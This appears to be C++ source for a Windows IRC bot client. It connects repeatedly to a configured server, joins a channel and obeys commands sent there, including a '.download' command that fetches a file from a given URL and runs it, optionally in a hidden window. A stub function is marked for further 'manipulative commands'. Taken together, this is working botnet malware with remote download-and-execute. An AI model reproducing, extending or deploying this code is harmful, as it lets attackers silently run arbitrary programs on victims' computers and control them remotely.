#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif
//General includes:
#include <iostream>
#include <stdio.h>
#include <string>
#include <winsock.h>
#include "config.h"
#include <time.h>
#include <windows.h>
#include <tchar.h>
#include <urlmon.h>
#include <thread>

SOCKET sock;
#pragma comment (lib, "ws2_32.lib")
#pragma comment(lib, "urlmon.lib")

class IRC {

	char * command;
public:
	char buffer[256];
	bool isvhost;
	char * pathtodl;
	bool isConnected;
	char * onlymsg;
	bool isSocketed = false;
	void SendFirstMessage(char * nick, char * user);
	bool Connect(int port,char * ip);
	void ReciveMsg();
	void CheckvHost(char * vhost);
	void ParseOnlyMsg();
	void isPing();
	bool CheckCommand();
	void Execute();
	int charSearch(char *toSearch, char *searchFor);
	bool SendMsg(char * sendmessage);
	void Download(std::string link, std::string path, char mode);
	void PrivMsg(char * channel, char * message);
} irc;

bool IRC::Connect(int port, char * ip)
{
	while (isSocketed == false)
	{
		WSADATA wsadata;
		int error = WSAStartup(0x0202, &wsadata);

		if (error) return false;
		if (wsadata.wVersion != 0x0202)
		{
			WSACleanup(); return false;
		}

		SOCKADDR_IN sockaddr; sockaddr.sin_family = AF_INET;

		sockaddr.sin_port = htons(port);
		sockaddr.sin_addr.s_addr = inet_addr(ip);

		sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (connect(sock, (SOCKADDR*)&sockaddr, sizeof(sockaddr)) != SOCKET_ERROR )
		{
			isSocketed = true;
		}
		else
		{
			Sleep(10000);
		}
	}
	return true;
}
void IRC::SendFirstMessage(char * nick, char * user)
{
	send(sock, nick, strlen(nick), NULL);
	send(sock, user, strlen(user), NULL);
}
void IRC::ReciveMsg()
{
	recv(sock, buffer, sizeof(buffer), NULL);
}
void IRC::CheckvHost(char * vhost)
{
	if (charSearch(buffer, vhost))
	{
		isvhost = true;
	}
}
void IRC::isPing()
{
	for (int c = 0; c != strlen(buffer); c++)
	{
		if ((buffer[c] == 'P') && (buffer[c + 1] == 'I') && (buffer[c + 2] == 'N') && (buffer[c + 3] == 'G'))
		{
			buffer[c + 1] = 'O';
			send(sock, buffer, strlen(buffer), NULL);
			if (isConnected == false)
			{
				send(sock, CHANNEL, strlen(CHANNEL), NULL);
				isConnected = true;
			}
		}
	}
}
void IRC::ParseOnlyMsg()
{
	if (int o = charSearch(buffer, " :"))
	{
		char * buff = &buffer[o+2];
		int i = charSearch(buff, "\r\n");
		buff[i] = '\0';
		onlymsg = buff;
	}
}
bool IRC::CheckCommand()
{
	
	if (charSearch(buffer, ".quit"))
	{
		SendMsg("QUIT :Exiting because you say so!\r\n");
		exit(103);
			return true;
	}
	if (charSearch(buffer, ".msgchan"))
	{
		PrivMsg("#all", "Welcome!");
		
		return true;
	}
	if(int o = charSearch(buffer, ".download"))
	{
		char * buff = &buffer[o + 10];
		int i = 0;
		for (;;)
		{
			if (buffer[o + 10 + i] == ' ')
			{
				buff[i] = '\0';
				break;
			}
			i++;
		}
		char * bufftwo = &buffer[o + 11 + i];
		int b = 0;
		for (;;)
		{
		
			if (buffer[o + 11 + i] == ' ')
			{
				bufftwo[b] = '\0';
				break;
			}
			i++;
			b++;
		}
		char m = 0;
		for (;;)
		{
			if (buffer[o + 12 + i] == '\0')
			{
				m = buffer[o + 11 + i];
				break;
			}
			i++;
		}
		std::thread tDownload(&IRC::Download,this,buff,bufftwo,m);

		tDownload.detach();


	}
	return false;
}
void IRC::Execute()
{
	// Manipulative commands : Visit given URL, get Windows version info, Screen resolution etc ... 
	
}
int IRC::charSearch(char *toSearch, char *searchFor)
{
	int len = strlen(toSearch);
	int forLen = strlen(searchFor); // The length of the searchfor field

	//Search through each char in toSearch
	for (int i = 0; i < len; i++)
	{
		//If the active char is equil to the first search item then search toSearch
		if (searchFor[0] == toSearch[i])
		{
			bool found = true;
			int a = i;
			//search the char array for search field
			for (int x = 1; x < forLen; x++)
			{
				if (toSearch[i + x] != searchFor[x])
				{
					found = false;
				}
			}

			//if found return true;
			if (found == true)
				return a;
		}
	}

	return 0;
}
bool IRC::SendMsg(char * sendmessage)
{
	
		int len = strlen(sendmessage);
		int bytes_sent = send(sock, sendmessage, len, 0);

		if (bytes_sent == 0)
			return false;
		else
			return true;
	
}
void IRC::Download(std::string link, std::string  path, char mode)
{

	HRESULT hr = URLDownloadToFile(NULL, _T(link.data()), _T(path.data()), 0, NULL);
	if (mode == '1')
	{
		ShellExecuteA(GetDesktopWindow(), "open", path.data(), NULL, NULL, SW_HIDE);
	}

	if (mode == '2')
	{
		ShellExecuteA(GetDesktopWindow(), "open", path.data(), NULL, NULL, SW_SHOW);
	}
	PrivMsg("#all","Done!");
}
void IRC::PrivMsg(char * channel, char * message)
{
		char finalmsg[256] = "PRIVMSG ";
		strncat(finalmsg, channel,strlen(channel));
		strncat(finalmsg, " :", 2);
		strncat(finalmsg, message, strlen(message));
		strncat(finalmsg, "\r\n",2);
		SendMsg(finalmsg);
}